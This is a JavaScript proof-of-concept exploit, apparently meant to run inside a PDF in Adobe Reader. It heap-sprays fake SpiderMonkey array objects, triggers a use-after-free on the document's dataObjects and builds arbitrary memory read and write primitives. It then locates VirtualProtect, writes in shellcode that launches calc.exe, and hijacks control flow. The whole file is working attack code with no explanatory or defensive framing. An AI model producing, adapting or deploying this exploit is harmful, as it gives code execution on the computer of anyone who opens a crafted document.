console.show();

var FAKE_ARRAY_JSOBJ_ADDR = 0x5D00005C;

var arrA = new Array(0x8000);
for (var i = 0; i < arrA.length; i++) {
    arrA[i] = new ArrayBuffer(0x10000 - 0x10 - 0x8);
    var tempDV = new DataView(arrA[i]);
    //shape
    tempDV.setUint32(0x4, FAKE_ARRAY_JSOBJ_ADDR + 0x10, true);
    //type
    tempDV.setUint32(0x8, FAKE_ARRAY_JSOBJ_ADDR + 0x50, true);
    //slot
    tempDV.setUint32(0xC, 0, true);
    //elements
    tempDV.setUint32(0x10, FAKE_ARRAY_JSOBJ_ADDR + 0x80, true);

    //shape.base_
    tempDV.setUint32(0x14, FAKE_ARRAY_JSOBJ_ADDR + 0x20, true);

    //shape.base.clasp
    tempDV.setUint32(0x24, FAKE_ARRAY_JSOBJ_ADDR + 0x40, true);
    //shape.base.flag(HAD_ELEMENTS_ACCESS)
    tempDV.setUint32(0x34, 0x1000, true);

    //shape.type.clasp
    tempDV.setUint32(0x54, FAKE_ARRAY_JSOBJ_ADDR + 0x60, true);

    //flag
    tempDV.setUint32(0x74, 0, true);
    //initializedLenght  
    tempDV.setUint32(0x78, 0xFFFF, true);
    //capacity  
    tempDV.setUint32(0x7C, 0xFFFF, true);
    //length
    tempDV.setUint32(0x80, 0xFFFF, true);
}

var ESObjectSize = 0x48;
var arrB = new Array(0x1500);
var SparyStrA = "A".repeat(0x200);
for (var i = 0; i < arrB.length; i++) {
    arrB[i] = SparyStrA.substring(0, (ESObjectSize / 2) - 1).toUpperCase();
}

for (var i = 0; i < arrB.length; i += 0x2) {
    arrB[i] = null;
    arrB[i] = undefined;
}

function triggerUAF() {
    var arrC = new Array(0x3000);
    var SparyStrB = unescape("%u005C%u5D00").repeat(0x200)
    for (var i = 0; i < arrC.length; i++) {
        arrC[i] = SparyStrB.substr(0, (ESObjectSize / 2) - 1).toUpperCase();
    }

    var fakeArrObj = this.dataObjects[0];
    fakeArrObj[0x1FEE] = 2.12199579047120666927013567069E-314;

    for (var i = 0; i < arrA.length; i++) {
        if (arrA[i].byteLength == -1) {
            var curruptArrayBuffer = arrA[i];
            var rwDV = new DataView(arrA[i]);
        }
    }

    if (!rwDV) {
        return;
    }

    function readUint32(dataView, readAddr) {
        var offsetAddr = readAddr - 0x5D010058;
        if (offsetAddr < 0) {
            offsetAddr = offsetAddr + 0xFFFFFFFF + 1;
        }
        return dataView.getUint32(offsetAddr, true);
    }

    function writeUint32(dataView, writeAddr, value) {
        var offsetAddr = writeAddr - 0x5D010058;
        if (offsetAddr < 0) {
            offsetAddr = offsetAddr + 0xFFFFFFFF + 1;
        }
        return dataView.setUint32(offsetAddr, value, true);
    }

    EScriptModAddr = readUint32(rwDV, readUint32(rwDV, 0x5D010050) + 0xC) - 0x275528;
    VirtualProtectAddr = readUint32(rwDV, EScriptModAddr + 0x1AF058);

    var dataViewObjPtr = rwDV.getUint32(0xFFFFFFFF + 0x1 - 0x8, true);
    var dvShape = readUint32(rwDV, dataViewObjPtr);
    var dvShapeBase = readUint32(rwDV, dvShape);
    var dvShapeBaseClasp = readUint32(rwDV, dvShapeBase);

    var shellcode = [0x0082e8fc, 0x89600000, 0x64c031e5, 0x8b30508b, 0x528b0c52, 0x28728b14, 0x264ab70f, 0x3cacff31,
        0x2c027c61, 0x0dcfc120, 0xf2e2c701, 0x528b5752, 0x3c4a8b10, 0x78114c8b, 0xd10148e3, 0x20598b51,
        0x498bd301, 0x493ae318, 0x018b348b, 0xacff31d6, 0x010dcfc1, 0x75e038c7, 0xf87d03f6, 0x75247d3b,
        0x588b58e4, 0x66d30124, 0x8b4b0c8b, 0xd3011c58, 0x018b048b, 0x244489d0, 0x615b5b24, 0xff515a59,
        0x5a5f5fe0, 0x8deb128b, 0x8d016a5d, 0x0000b285, 0x31685000, 0xff876f8b, 0xb5f0bbd5, 0xa66856a2,
        0xff9dbd95, 0x7c063cd5, 0xe0fb800a, 0x47bb0575, 0x6a6f7213, 0xd5ff5300, 0x636c6163, 0x6578652e,
        0x00000000]

    var shellcodesize = shellcode.length * 4;

    writeUint32(rwDV, 0x5D000001, VirtualProtectAddr);
    writeUint32(rwDV, 0x5D000005, 0x5D010058 + 0x18);
    writeUint32(rwDV, 0x5D000009, 0x5D010058 + 0x18);
    writeUint32(rwDV, 0x5D00000D, shellcodesize);
    writeUint32(rwDV, 0x5D000011, 0x40);
    writeUint32(rwDV, 0x5D000015, 0x5D010058 + 0x14);

    for (var i = 0; i < shellcode.length; i++) {
        writeUint32(rwDV, 0x5D010058 + 0x18 + i * 4, shellcode[i]);
    }

    writeUint32(rwDV, dvShapeBaseClasp + 0x10, EScriptModAddr + 0x103e3e);
    var foo = rwDV.execFlowHijack;
}

this.dataObjects[0].toString();
this.dataObjects[0] = null;
g_timeout = app.setTimeOut("triggerUAF()", 1000);